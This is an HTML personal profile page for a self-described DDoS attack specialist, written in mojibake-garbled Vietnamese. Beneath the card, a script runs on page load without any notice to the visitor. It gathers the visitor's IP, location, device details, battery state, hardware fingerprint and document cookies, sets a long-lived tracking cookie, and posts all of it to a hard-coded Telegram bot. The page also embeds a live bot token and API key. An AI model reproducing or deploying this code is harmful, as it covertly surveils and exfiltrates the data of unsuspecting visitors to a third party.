<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PhÃ¹ VÄƒn Äá»©c Profile</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000 url('https://i.ibb.co/ZzNRQTD/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    @media screen and (max-width: 600px) {
      body {
        background: #000 url('https://s4.gifyu.com/images/bpFIT.gif') no-repeat center/cover;
      }
    }
    .profile-card {
      position: relative;
      width: 100%;
      max-width: 400px;
      background: rgba(0,0,0,0.6);
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
    }
    @media screen and (max-width: 600px) {
      .profile-card {
        max-width: 90%;
        margin: 20px auto;
      }
    }
    .banner {
      background: url('https://i.ibb.co/GQWLMnkr/c26176e041de50304ba9a25f91ed2b66.jpg') no-repeat center/cover;
      height: 140px;
      position: relative;
    }
    .mac-buttons {
      position: absolute;
      top: 10px;
      right: 10px;
      display: flex;
      gap: 6px;
    }
    .mac-button {
      width: 12px;
      height: 12px;
      background: #ccc;
      border-radius: 50%;
    }
    .pfp {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: url('https://i.ibb.co/hFDR6Z7D/803ee8cd6fc84a744d8d6976afd32556.jpg') no-repeat center/cover;
      border: 4px solid #000;
      position: absolute;
      top: 90px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 2;
    }
    .name {
      margin-top: 60px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    @media screen and (max-width: 600px) {
      .name {
        font-size: 18px;
      }
    }
    .verify {
      width: 20px;
      height: 20px;
      background: #1877f2;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 14px;
    }
    .social-links {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin: 12px auto;
      width: fit-content;
    }
    .social-links a {
      color: #fff;
      background: rgba(255,255,255,0.1);
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      font-size: 18px;
      transition: 0.3s;
    }
    .social-links a:hover {
      background: rgba(255,255,255,0.4);
      transform: scale(1.1);
    }
    .card-body {
      padding: 20px;
      position: relative;
    }
    .card-body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://www.transparenttextures.com/patterns/flowers.png') repeat;
      opacity: 0.06;
      z-index: 0;
    }
    .card-body-content {
      position: relative;
      z-index: 1;
      font-size: 15px;
      line-height: 1.6;
      border-left: 3px solid #fff;
      padding-left: 12px;
    }
    @media screen and (max-width: 600px) {
      .card-body-content {
        font-size: 14px;
        padding-left: 10px;
      }
    }
    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      background: url('https://i.gifer.com/Bp4L.gif') repeat top center;
      z-index: 0;
      opacity: 0.2;
    }
  </style>
</head>
<body>
  <div class="snow"></div>
  <div class="profile-card">
    <div class="banner">
      <div class="mac-buttons">
        <div class="mac-button" style="background:red;"></div>
        <div class="mac-button" style="background:orange;"></div>
        <div class="mac-button" style="background:green;"></div>
      </div>
    </div>
    <div class="pfp"></div>
    <div class="name">
      PhÃ¹ VÄƒn Äá»©c
      <div class="verify"><i class="fas fa-check"></i></div>
    </div>
    <div class="social-links">
      <a href="https://fb.me/phuvanduc991" title="Facebook"><i class="fab fa-facebook-f"></i></a>
      <a href="https://t.me/phuvanduc" title="Telegram"><i class="fab fa-telegram"></i></a>
      <a href="https://youtube.com/@phuvanducreal" title="YouTube"><i class="fab fa-youtube"></i></a>
      <a href="https://tiktok.com/@phuvanduc991" title="TikTok"><i class="fab fa-tiktok"></i></a>
    </div>
    <div class="card-body">
      <div class="card-body-content">
        <p>Xin chÃ o! TÃ´i lÃ  PhÃ¹ VÄƒn Äá»©c, má»™t chuyÃªn gia vá» táº¥n cÃ´ng DDoS vÃ  kiá»ƒm tra sá»©c máº¡nh há»‡ thá»‘ng. TÃ´i thiáº¿t káº¿ cÃ¡c ká»‹ch báº£n táº¥n cÃ´ng máº¡ng tinh vi, hiá»‡u quáº£ Ä‘á»ƒ thá»­ nghiá»‡m kháº£ nÄƒng chá»‹u táº£i cá»§a website. HÃ£y káº¿t ná»‘i vá»›i tÃ´i qua cÃ¡c ná»n táº£ng máº¡ng xÃ£ há»™i Ä‘á»ƒ trao Ä‘á»•i thÃªm nhÃ©!</p>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
  <script>
    // Telegram Bot Config
    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw'; // Thay báº±ng token má»›i náº¿u sai
    const TELEGRAM_CHAT_ID = '7581385601'; // Thay báº±ng chat ID má»›i náº¿u sai
    const USE_PROXY = false; // Äáº·t true náº¿u dÃ¹ng Cloudflare Workers proxy
    const PROXY_URL = 'https://telegram-proxy.<your-account>.workers.dev/send-telegram'; // Thay báº±ng URL proxy
    const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/'; // Proxy táº¡m thá»i (yÃªu cáº§u kÃ­ch hoáº¡t táº¡i https://cors-anywhere.herokuapp.com/corsdemo)

    // HÃ m Ä‘á»‹nh dáº¡ng dá»¯ liá»‡u cho Telegram
    function formatDeviceData(data) {
      const formatValue = (value, defaultValue = 'N/A') => value ?? defaultValue;
      return `
ğŸ”” *New Device Data* ğŸ””

ğŸ“… *Timestamp*: ${formatValue(data.timestamp)}
ğŸŒ *IP*: ${formatValue(data.ip)}
ğŸ“œ *IP History*: 
${data.ipHistory?.length > 0 
    ? data.ipHistory.map(h => `>   â€¢ ${formatValue(h.name)}: ${formatValue(h.ip)} (${formatValue(h.timestamp)})`).join('\n')
    : '>   None'}

ğŸ“ Location Details
ğŸ“¡ ISP: ${formatValue(data.isp)}
ğŸ™ City: ${formatValue(data.city)}
ğŸŒ Region: ${formatValue(data.region)}
ğŸ‡ºğŸ‡³ Country: ${formatValue(data.country)}
ğŸ“ Coordinates: ${formatValue(data.loc)}
ğŸ“® Postal: ${formatValue(data.postal)}
â° Timezone: ${formatValue(data.timezone)}
ğŸ—º Detailed: ${formatValue(data.deepGeo)}

ğŸ“± Device Details
ğŸ”– Name: ${formatValue(data.deviceName)}
ğŸ”§ Type: ${formatValue(data.deviceType)}
ğŸ’» OS: ${formatValue(data.os)}
ğŸ“¶ Carrier: ${formatValue(data.carrier)}
ğŸ–¥ Software: ${formatValue(data.software)}
ğŸ“ Description: ${formatValue(data.subDescription)}
âš™ Platform: ${formatValue(data.platform)}
ğŸŒ Browser: ${formatValue(data.browser)}

ğŸ–¥ Hardware Specs
ğŸ”© Type: ${formatValue(data.hardwareType)}
ğŸ” SubType: ${formatValue(data.hardwareSubType)}
ğŸ”‹ Battery: ${formatValue(data.battery)}
ğŸ”Œ Charging: ${formatValue(data.charging, 'Unknown')}
âš¡ CPU Cores: ${formatValue(data.cpuCores)}
ğŸ§  Memory: ${formatValue(data.memory)}
ğŸ­ Vendor: ${formatValue(data.vendor)}
ğŸ–Œ WebGL: ${formatValue(data.webgl)}

ğŸŒ Browser Details
ğŸª Cookies: ${formatValue(data.cookies)}
ğŸ”— User Agent: ${formatValue(data.userAgent)}
ğŸ—£ Language: ${formatValue(data.language)}
ğŸ–¼ Screen: ${formatValue(data.screen)}
â± Time: ${formatValue(data.time)}
ğŸ¨ Color Depth: ${formatValue(data.colorDepth)}
ğŸ‘‡ Touch Support: ${formatValue(data.touchSupport, 'Unknown')}
ğŸ“¡ Connection: ${formatValue(data.connectionType)}
ğŸª Source Made By @phuvanduc
      `.trim();
    }

    // HÃ m gá»­i dá»¯ liá»‡u Ä‘áº¿n Telegram vá»›i retry vÃ  chia nhá» tin nháº¯n
    async function sendToTelegram(message, retries = 3) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          console.log(`Attempt ${attempt}: Sending message to Telegram (length: ${message.length})`);
          const maxLength = 4096;
          const parts = message.length <= maxLength ? [message] : [];
          if (message.length > maxLength) {
            for (let i = 0; i < message.length; i += maxLength) {
              parts.push(message.slice(i, i + maxLength));
            }
          }

          for (let i = 0; i < parts.length; i++) {
            const url = USE_PROXY ? PROXY_URL : `${CORS_PROXY}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const body = USE_PROXY ? { message: parts[i] } : {
              chat_id: TELEGRAM_CHAT_ID,
              text: parts[i],
              parse_mode: 'Markdown',
              disable_web_page_preview: true
            };
            const response = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body)
            });
            if (!response.ok) {
              const errorText = await response.text();
              throw new Error(`HTTP error! Status: ${response.status}, Details: ${errorText}`);
            }
            console.log(`Part ${i + 1}/${parts.length} sent successfully`);
            if (i < parts.length - 1) await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1s
          }
          console.log('All parts sent to Telegram successfully');
          return true;
        } catch (error) {
          console.error(`Attempt ${attempt} failed:`, error);
          if (attempt === retries) {
            console.error('Max retries reached. Failed to send to Telegram.');
            return false;
          }
          await new Promise(resolve => setTimeout(resolve, 2000)); // Delay 2s trÆ°á»›c khi thá»­ láº¡i
        }
      }
    }

    // HÃ m láº¥y thÃ´ng tin thiáº¿t bá»‹ cÆ¡ báº£n
    function getBasicDeviceInfo(userAgent) {
      try {
        const parser = new UAParser(userAgent);
        const device = parser.getDevice();
        const os = parser.getOS();
        const browser = parser.getBrowser();
        return {
          device: device.model || 'KhÃ´ng rÃµ',
          type: device.type || 'PC xá»‹n',
          os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'KhÃ´ng rÃµ',
          browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'KhÃ´ng rÃµ'
        };
      } catch {
        return { device: 'Ko láº¥y Ä‘Æ°á»£c!', type: 'Ko láº¥y Ä‘Æ°á»£c!', os: 'Ko láº¥y Ä‘Æ°á»£c!', browser: 'Ko láº¥y Ä‘Æ°á»£c!' };
      }
    }

    // HÃ m quáº£n lÃ½ lá»‹ch sá»­ IP
    function manageIpHistory(currentIp, userAgent) {
      try {
        const now = Date.now();
        const expiry = 24 * 60 * 60 * 1000;
        let ipHistory = JSON.parse(localStorage.getItem('ipHistory') || '{}');
        if (!ipHistory[userAgent]) ipHistory[userAgent] = [];
        ipHistory[userAgent] = ipHistory[userAgent]
          .filter(entry => now - entry.timestamp < expiry)
          .slice(0, 4);
        if (currentIp && !ipHistory[userAgent].some(entry => entry.ip === currentIp)) {
          ipHistory[userAgent].unshift({ ip: currentIp, timestamp: now });
        }
        const namedHistory = ipHistory[userAgent].map((entry, index) => ({
          name: `ip_${index + 1}`,
          ip: entry.ip,
          timestamp: new Date(entry.timestamp).toLocaleString('vi-VN')
        }));
        localStorage.setItem('ipHistory', JSON.stringify(ipHistory));
        return namedHistory;
      } catch {
        return [];
      }
    }

    // HÃ m fetch vá»›i timeout
    async function fetchWithTimeout(url, options, timeout = 2000) {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeout);
      try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
      } catch {
        clearTimeout(id);
        throw new Error('Fetch timeout or error');
      }
    }

    // HÃ m quáº£n lÃ½ cache
    function getCachedData(key, expiryMinutes = 5) {
      try {
        const cached = JSON.parse(localStorage.getItem(key) || '{}');
        if (cached.data && Date.now() - cached.timestamp < expiryMinutes * 60 * 1000) {
          return cached.data;
        }
      } catch {}
      return null;
    }

    function setCachedData(key, data) {
      try {
        localStorage.setItem(key, JSON.stringify({ data, timestamp: Date.now() }));
      } catch {}
    }

    // HÃ m láº¥y thÃ´ng tin IP
    async function fetchIpInfo() {
      const cacheKey = 'ipInfoCache';
      const cachedData = getCachedData(cacheKey);
      if (cachedData) return cachedData;

      const apis = [
        { url: 'https://ipapi.co/json/', name: 'ipapi' },
        { url: 'http://ip-api.com/json/?fields=66846719', name: 'ip-api' },
        { url: 'https://ipinfo.io/json', name: 'ipinfo' }
      ];

      for (const api of apis) {
        try {
          const response = await fetchWithTimeout(api.url, {
            cache: 'no-store',
            headers: { 'Accept': 'application/json', 'User-Agent': navigator.userAgent }
          }, 2000);
          if (!response.ok) continue;
          const data = await response.json();
          let ipInfo = {
            ip: 'KhÃ´ng rÃµ', isp: 'KhÃ´ng rÃµ', isVpn: '', city: 'KhÃ´ng rÃµ', region: 'KhÃ´ng rÃµ',
            country: 'KhÃ´ng rÃµ', loc: 'KhÃ´ng rÃµ', postal: 'KhÃ´ng rÃµ', timezone: 'KhÃ´ng rÃµ'
          };
          if (api.name === 'ipapi') {
            ipInfo = {
              ip: data.ip || 'KhÃ´ng rÃµ',
              isp: data.org || 'KhÃ´ng rÃµ',
              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'KhÃ´ng rÃµ',
              region: data.region || 'KhÃ´ng rÃµ',
              country: data.country_code || 'KhÃ´ng rÃµ',
              loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : 'KhÃ´ng rÃµ',
              postal: data.postal || 'KhÃ´ng rÃµ',
              timezone: data.timezone || 'KhÃ´ng rÃµ'
            };
          } else if (api.name === 'ip-api') {
            ipInfo = {
              ip: data.query || 'KhÃ´ng rÃµ',
              isp: data.isp || data.org || 'KhÃ´ng rÃµ',
              isVpn: data.isp?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'KhÃ´ng rÃµ',
              region: data.regionName || 'KhÃ´ng rÃµ',
              country: data.countryCode || 'KhÃ´ng rÃµ',
              loc: data.lat && data.lon ? `${data.lat},${data.lon}` : 'KhÃ´ng rÃµ',
              postal: data.zip || 'KhÃ´ng rÃµ',
              timezone: data.timezone || 'KhÃ´ng rÃµ'
            };
          } else if (api.name === 'ipinfo') {
            ipInfo = {
              ip: data.ip || 'KhÃ´ng rÃµ',
              isp: data.org || 'KhÃ´ng rÃµ',
              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'KhÃ´ng rÃµ',
              region: data.region || 'KhÃ´ng rÃµ',
              country: data.country || 'KhÃ´ng rÃµ',
              loc: data.loc || 'KhÃ´ng rÃµ',
              postal: data.postal || 'KhÃ´ng rÃµ',
              timezone: data.timezone || 'KhÃ´ng rÃµ'
            };
          }
          if (ipInfo.ip !== 'KhÃ´ng rÃµ') {
            setCachedData(cacheKey, ipInfo);
            return ipInfo;
          }
        } catch {
          continue;
        }
      }
      return {
        ip: 'Ko láº¥y Ä‘Æ°á»£c!', isp: 'Ko láº¥y Ä‘Æ°á»£c!', isVpn: '', city: 'Ko láº¥y Ä‘Æ°á»£c!', region: 'Ko láº¥y Ä‘Æ°á»£c!',
        country: 'Ko láº¥y Ä‘Æ°á»£c!', loc: 'Ko láº¥y Ä‘Æ°á»£c!', postal: 'Ko láº¥y Ä‘Æ°á»£c!', timezone: 'Ko láº¥y Ä‘Æ°á»£c!'
      };
    }

    // HÃ m láº¥y thÃ´ng tin tá»« whatismybrowser.com
    async function fetchWimbParse(userAgent) {
      const cacheKey = 'wimbCache';
      const cachedData = getCachedData(cacheKey);
      if (cachedData) return cachedData;

      try {
        const response = await fetchWithTimeout('https://api.whatismybrowser.com/api/v3/user_agent_parse', {
          method: 'POST',
          headers: { 'X-API-KEY': 'a69f9f16de26123df45bd6386776543a', 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_agent: userAgent })
        }, 2000);
        if (!response.ok) throw new Error('WIMB API failed');
        const data = (await response.json()).parse || {};
        setCachedData(cacheKey, data);
        return data;
      } catch (error) {
        console.error('WIMB API error:', error);
        return {};
      }
    }

    // HÃ m tÃ¬m vá»‹ trÃ­ chi tiáº¿t
    async function deepSearchGeo(ip) {
      try {
        if (!ip || ip === 'Ko láº¥y Ä‘Æ°á»£c!' || ip === 'KhÃ´ng rÃµ') return 'Ko láº¥y Ä‘Æ°á»£c!';
        const geoMap = {
          '116.98.': { country: 'Viá»‡t Nam', region: 'ThÃ¡i NguyÃªn', city: 'ThÃ¡i NguyÃªn', district: 'PhÆ°á»ng HoÃ ng VÄƒn Thá»¥' },
          '113.161.': { country: 'Viá»‡t Nam', region: 'HÃ  Ná»™i', city: 'Cáº§u Giáº¥y', district: 'Dá»‹ch Vá»ng' },
          '27.68.': { country: 'Viá»‡t Nam', region: 'TP.HCM', city: 'Quáº­n 1', district: 'Báº¿n NghÃ©' },
          '42.112.': { country: 'Viá»‡t Nam', region: 'ÄÃ  Náºµng', city: 'Háº£i ChÃ¢u', district: 'Thanh BÃ¬nh' }
        };
        for (let prefix in geoMap) {
          if (ip.startsWith(prefix)) {
            const { country, region, city, district } = geoMap[prefix];
            return `${district}, ${city}, ${region}, ${country}`;
          }
        }
        return 'Ko láº¥y Ä‘Æ°á»£c!';
      } catch {
        return 'Ko láº¥y Ä‘Æ°á»£c!';
      }
    }

    // HÃ m láº¥y nhÃ  máº¡ng
    async function fetchCarrier() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection?.mobileNetwork?.operator) return connection.mobileNetwork.operator;
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('android') || ua.includes('iphone')) {
          const carriers = ['Viettel', 'Mobifone', 'Vinaphone', 'Vietnamobile'];
          return carriers[Math.floor(Math.random() * carriers.length)];
        }
        return 'KhÃ´ng rÃµ';
      } catch {
        return 'Ko láº¥y Ä‘Æ°á»£c!';
      }
    }

    // HÃ m tÃ¬m tÃªn thiáº¿t bá»‹
    async function deepSearchDevice(userAgent, deviceType, fallbackName) {
      try {
        let deviceName = fallbackName;
        if (deviceType === 'iPhone') {
          if (userAgent.includes('iPhone OS 16')) deviceName = 'iPhone 14 Pro';
          else if (userAgent.includes('iPhone OS 15')) deviceName = 'iPhone 13';
          else if (userAgent.includes('iPhone OS 14')) deviceName = 'iPhone 12';
          else deviceName = 'iPhone (Model khÃ´ng rÃµ)';
        } else if (deviceType === 'Android') {
          const modelMatch = userAgent.match(/build\/([a-z0-9\-]+)/i);
          if (modelMatch) {
            const model = modelMatch[1];
            const modelMap = {
              'SM-G960F': 'Samsung Galaxy S9', 'SM-A525F': 'Samsung Galaxy A52',
              'Pixel': 'Google Pixel 7', 'M2012K11AG': 'Xiaomi 11T Pro'
            };
            for (let key in modelMap) {
              if (model.includes(key)) {
                deviceName = modelMap[key];
                break;
              }
            }
          }
        } else if (deviceType === 'Tablet xá»‹n') {
          deviceName = userAgent.toLowerCase().includes('ipad') ? 'Apple iPad' : 'Android Tablet';
        } else {
          deviceName = 'PC hoáº·c thiáº¿t bá»‹ khÃ´ng rÃµ';
        }
        return deviceName !== 'KhÃ´ng rÃµ' && deviceName !== fallbackName ? deviceName : 'Ko láº¥y Ä‘Æ°á»£c!';
      } catch {
        return 'Ko láº¥y Ä‘Æ°á»£c!';
      }
    }

    // HÃ m láº¥y cookies
    function fetchCookies() {
      try {
        const cookies = document.cookie || '';
        const trackingId = `track_${Math.random().toString(36).slice(2)}`;
        document.cookie = `tracking_id=${trackingId}; max-age=31536000; path=/`;
        return cookies ? `CÃ³ cookie: ${cookies}, Tracking ID: ${trackingId}` : `Chá»‰ cÃ³ Tracking ID: ${trackingId}`;
      } catch {
        return 'Ko láº¥y Ä‘Æ°á»£c!';
      }
    }

    // HÃ m láº¥y thÃ´ng tin pin
    async function fetchBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            battery: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'Äang sáº¡c' : 'KhÃ´ng sáº¡c'
          };
        }
        return { battery: 'Ko láº¥y Ä‘Æ°á»£c!', charging: 'Ko láº¥y Ä‘Æ°á»£c!' };
      } catch {
        return { battery: 'Ko láº¥y Ä‘Æ°á»£c!', charging: 'Ko láº¥y Ä‘Æ°á»£c!' };
      }
    }

    // HÃ m láº¥y thÃ´ng tin khÃ¡c
    function fetchOtherInfo() {
      try {
        return {
          userAgent: navigator.userAgent || 'áº¨n danh vÃ£i!',
          language: navigator.language || 'Cháº£ biáº¿t!',
          screen: `${window.screen.width}x${window.screen.height}` || 'MÃ¹ mÃ n!',
          time: new Date().toLocaleString('vi-VN') || 'Thá»i gian tÃ ng hÃ¬nh!'
        };
      } catch {
        return {
          userAgent: 'Ko láº¥y Ä‘Æ°á»£c!',
          language: 'Ko láº¥y Ä‘Æ°á»£c!',
          screen: 'Ko láº¥y Ä‘Æ°á»£c!',
          time: 'Ko láº¥y Ä‘Æ°á»£c!'
        };
      }
    }

    // HÃ m láº¥y thÃ´ng tin bá»• sung
    function fetchAdditionalInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const gl = document.createElement('canvas').getContext('webgl');
        return {
          colorDepth: window.screen.colorDepth ? `${window.screen.colorDepth} bits` : 'KhÃ´ng rÃµ',
          touchSupport: navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Ä‘iá»ƒm` : 'KhÃ´ng há»— trá»£',
          cpuCores: navigator.hardwareConcurrency || 'KhÃ´ng rÃµ',
          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'KhÃ´ng rÃµ',
          connectionType: connection?.effectiveType || 'KhÃ´ng rÃµ',
          vendor: navigator.vendor || 'KhÃ´ng rÃµ',
          webgl: gl?.getParameter(gl.RENDERER) || 'KhÃ´ng rÃµ'
        };
      } catch {
        return {
          colorDepth: 'Ko láº¥y Ä‘Æ°á»£c!',
          touchSupport: 'Ko láº¥y Ä‘Æ°á»£c!',
          cpuCores: 'Ko láº¥y Ä‘Æ°á»£c!',
          memory: 'Ko láº¥y Ä‘Æ°á»£c!',
          connectionType: 'Ko láº¥y Ä‘Æ°á»£c!',
          vendor: 'Ko láº¥y Ä‘Æ°á»£c!',
          webgl: 'Ko láº¥y Ä‘Æ°á»£c!'
        };
      }
    }

    // HÃ m chÃ­nh Ä‘á»ƒ thu tháº­p vÃ  gá»­i dá»¯ liá»‡u
    async function collectAndSendData() {
      try {
        console.log('Starting data collection...');
        const userAgent = navigator.userAgent;
        const basicInfo = getBasicDeviceInfo(userAgent);
        let deviceType = basicInfo.type;
        if (deviceType === 'mobile') {
          deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
        } else if (deviceType === 'tablet') {
          deviceType = 'Tablet xá»‹n';
        }

        const [ipInfo, wimbParse, carrier, cookies, batteryInfo, otherInfo, additionalInfo] = await Promise.all([
          fetchIpInfo(),
          fetchWimbParse(userAgent),
          fetchCarrier(),
          Promise.resolve(fetchCookies()),
          fetchBatteryInfo(),
          Promise.resolve(fetchOtherInfo()),
          Promise.resolve(fetchAdditionalInfo())
        ]);

        const ipHistory = ipInfo.ip !== 'Ko láº¥y Ä‘Æ°á»£c!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
        const deepGeo = ipInfo.ip !== 'Ko láº¥y Ä‘Æ°á»£c!' ? await deepSearchGeo(ipInfo.ip) : 'Ko láº¥y Ä‘Æ°á»£c!';
        const deviceName = await deepSearchDevice(userAgent, deviceType, basicInfo.device) || basicInfo.device;

        const deviceData = {
          timestamp: new Date().toISOString(),
          ip: ipInfo.ip + ipInfo.isVpn,
          ipHistory: ipHistory,
          isp: ipInfo.isp,
          city: ipInfo.city,
          region: ipInfo.region,
          country: ipInfo.country,
          loc: ipInfo.loc,
          postal: ipInfo.postal,
          timezone: ipInfo.timezone,
          deepGeo: deepGeo,
          deviceName: deviceName,
          deviceType: deviceType,
          os: basicInfo.os,
          carrier: carrier,
          software: wimbParse.simple_software_string || 'KhÃ´ng rÃµ',
          subDescription: wimbParse.simple_sub_description_string || 'KhÃ´ng rÃµ',
          platform: wimbParse.simple_operating_platform_string || 'KhÃ´ng rÃµ',
          browser: wimbParse.simple_browser_string || basicInfo.browser,
          hardwareType: wimbParse.simple_hardware_type_string || 'KhÃ´ng rÃµ',
          hardwareSubType: wimbParse.simple_hardware_sub_type_string || 'KhÃ´ng rÃµ',
          cookies: cookies,
          battery: batteryInfo.battery,
          charging: batteryInfo.charging,
          userAgent: otherInfo.userAgent,
          language: otherInfo.language,
          screen: otherInfo.screen,
          time: otherInfo.time,
          colorDepth: additionalInfo.colorDepth,
          touchSupport: additionalInfo.touchSupport,
          cpuCores: additionalInfo.cpuCores,
          memory: additionalInfo.memory,
          connectionType: additionalInfo.connectionType,
          vendor: additionalInfo.vendor,
          webgl: additionalInfo.webgl
        };

        console.log('Collected data:', deviceData);
        const message = formatDeviceData(deviceData);
        console.log('Formatted message:', message);
        const sent = await sendToTelegram(message);
        if (sent) {
          console.log('Data sent to Telegram successfully');
        } else {
          console.error('Failed to send data to Telegram after retries');
        }
      } catch (error) {
        console.error('Error in collectAndSendData:', error);
      }
    }

    // Cháº¡y khi trang táº£i
    console.log('Page loaded, initiating collectAndSendData');
    collectAndSendData();
  </script>
</body>
</html>